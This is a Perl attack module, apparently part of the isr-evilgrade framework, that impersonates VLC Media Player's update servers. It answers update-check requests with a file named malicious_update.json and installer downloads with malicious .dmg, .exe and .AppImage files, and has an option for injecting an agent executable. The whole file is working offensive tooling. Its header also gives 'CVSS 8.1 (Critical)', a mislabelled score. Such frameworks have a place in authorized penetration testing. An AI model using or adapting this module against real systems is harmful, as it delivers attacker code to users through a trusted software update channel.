###############
# vlc_update.pm
#
# VLC Media Player Update Hijacking
# Intercepts update checks from vlc.videolan.org
# CVSS 8.1 (Critical) - Arbitrary Code Execution
#
# This file is part of isr-evilgrade, www.faradaysec.com .

package modules::vlc_update;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $base = {
    'name'        => 'VLC Media Player Update',
    'version'     => '1.0',
    'appver'      => 'VLC 3.0+',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>'],
    'description' => qq{Intercepts VLC Media Player update requests from vlc.videolan.org and injects malicious updates.},
    'vh' => '(vlc.videolan.org|update.videolan.org|www.videolan.org)',
    'request' => [
        {
            'req'    => '/.*update.*\.json',
            'type'   => 'file',
            'file'   => './include/vlc/malicious_update.json',
            'parse'  => 1,
            'method' => '',
            'bin'    => 0,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/json\r\n"
                . "Connection: close\r\n\r\n",
        },
        {
            'req'    => '/.*\.dmg',
            'type'   => 'file',
            'file'   => './include/vlc/malicious_vlc.dmg',
            'parse'  => 0,
            'method' => '',
            'bin'    => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/octet-stream\r\n"
                . "Connection: close\r\n\r\n",
        },
        {
            'req'    => '/.*\.exe',
            'type'   => 'file',
            'file'   => './include/vlc/malicious_vlc.exe',
            'parse'  => 0,
            'method' => '',
            'bin'    => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/octet-stream\r\n"
                . "Connection: close\r\n\r\n",
        },
        {
            'req'    => '/.*\.AppImage',
            'type'   => 'file',
            'file'   => './include/vlc/malicious_vlc.AppImage',
            'parse'  => 0,
            'method' => '',
            'bin'    => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/octet-stream\r\n"
                . "Connection: close\r\n\r\n",
        },
    ],
    'options' => {
        'agent' =>
            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
    }
};

sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}

1;
